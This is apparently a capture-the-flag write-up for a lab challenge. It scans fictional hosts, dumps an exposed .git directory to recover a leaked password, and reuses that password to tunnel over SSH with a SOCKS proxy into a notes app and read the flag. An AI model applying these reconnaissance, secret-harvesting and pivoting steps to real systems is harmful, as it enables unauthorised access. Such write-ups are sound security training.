# Johny's Notes

## Challenge

Hi, TCC-CSIRT analyst,

Admin Johny is testing a new notebook to take notes, as any good administrator would. He thinks he has correctly secured the application so that only he can access it and no one else. Your task is to check if he made any security lapses.

Admin Johny uses workstation `johny-station.cypherfix.tcc`.  
The application for notes runs on `notes.cypherfix.tcc`.  
See you in the next incident!

Hint: `/usr/sbin/nologin` is a good servant but a bad master.

## Solution

### 1. Enumeration

We started by scanning both `johny-station.cypherfix.tcc` and `notes.cypherfix.tcc`:

```bash
nmap -p1-65535 johny-station.cypherfix.tcc
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -p1-65535 notes.cypherfix.tcc
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
```

### 2. Inspecting Johny's Station and Notes

We used `Feroxbuster` and `Dirb` to enumerate `notes.cypherfix.tcc`, but the default wordlists did not reveal anything useful.

```bash
curl http://notes.cypherfix.tcc/
```

The site redirected to http://notes.cypherfix.tcc:8080, but TCP-wrapped protection prevented access (same as 8081).

Similarly, on Johny's station, the default Apache page was visible and standard wordlists did not yield any interesting results.

### 3. Discovering Johny's Home Directory

Using a more specific wordlist (`Apache.fuzz.txt`), we found Johny's user directory:

```bash
dirb http://johny-station.cypherfix.tcc /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt

+ http://johny-station.cypherfix.tcc/~backup (CODE:403|SIZE:292)
==> DIRECTORY: http://johny-station.cypherfix.tcc/~johny/
```

In Johny's home directory, we found a Flatnotes application with directory listing enabled: http://johny-station.cypherfix.tcc/~johny/flatnotes/
Flatnotes is an open-source note-taking application. Its GitHub repository is available here: https://github.com/dullage/flatnotes

However, no hidden files were visible. We checked for `.git`, which was available: http://johny-station.cypherfix.tcc/~johny/flatnotes/.git/

### 4. Extracting the Repository

The last commit message in the git repository looked interesting:

```bash
curl http://johny-station.cypherfix.tcc/~johny/flatnotes/.git/COMMIT_EDITMSG
User password for http://notes.cypherfix.tcc:8080
```

We used git-dumper to retrieve the repository:

```bash
python3 git_dumper.py http://johny-station.cypherfix.tcc/~johny/flatnotes/ flatnotes
```

Inspecting the repository revealed a change in the `README.md`:

```
   -e "PGID=1000" \
   -e "FLATNOTES_AUTH_TYPE=password" \
   -e "FLATNOTES_USERNAME=user" \
-  -e "FLATNOTES_PASSWORD=changeMe!" \
+  -e "FLATNOTES_PASSWORD=gojohnygo" \
   -e "FLATNOTES_SECRET_KEY=aLongRandomSeriesOfCharacters" \
   -v "$(pwd)/data:/data" \
   -p "8080:8080" \
```

This provided us with the password `gojohnygo`.

### 5. Bypassing Access Restrictions

We recalled the hint "`/usr/sbin/nologin` is a good servant but a bad master". Since SSH was open on Johny's station, we created a SOCKS proxy:

```bash
ssh -D 1080 johny@10.99.24.32 -N
```

Using the password `gojohnygo`, we successfully connected.

Next, we used `Firefox` with the SOCKS proxy set to `127.0.0.1:1080` and accessed the notes application at http://notes.cypherfix.tcc:8080/.

### 6. Retrieving the Flag

We logged in using the credentials:

- Username: `user`
- Password: `gojohnygo`

The flag was located at: http://notes.cypherfix.tcc:8080/note/flag

## Flag

```
FLAG{VfCK-Hlp4-cQl8-p0UM}
```
